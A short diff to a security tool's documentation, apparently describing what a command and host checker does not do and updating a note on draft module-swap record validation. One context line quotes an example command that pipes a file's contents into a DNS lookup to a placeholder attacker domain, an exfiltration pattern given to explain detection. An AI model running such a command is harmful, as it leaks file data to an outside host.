@@ -479,8 +479,10 @@ What it does not do:
 
   A name built by command substitution in a host position (`dig $(cat f).attacker.example`)
   still names its static suffix.
-- The module swap record's model-role leg (`{slot: cap:inference, role}`, `docs/modules.md`) is
-  not validated yet. The pin gate is where a rebind is checked today.
+- A module swap's model-role leg (`model_roles`, `docs/modules.md`, "Swap record 1.2") pins the
+  report for the rebound table and holds only when that report passes this check, live when the
+  leg requires it. That is still only the draft record's rules: no live swap runs through 1.2, and
+  a rebind within one provider module is checked by the pin gate alone.
 
 ### Baselines and defense layers
 
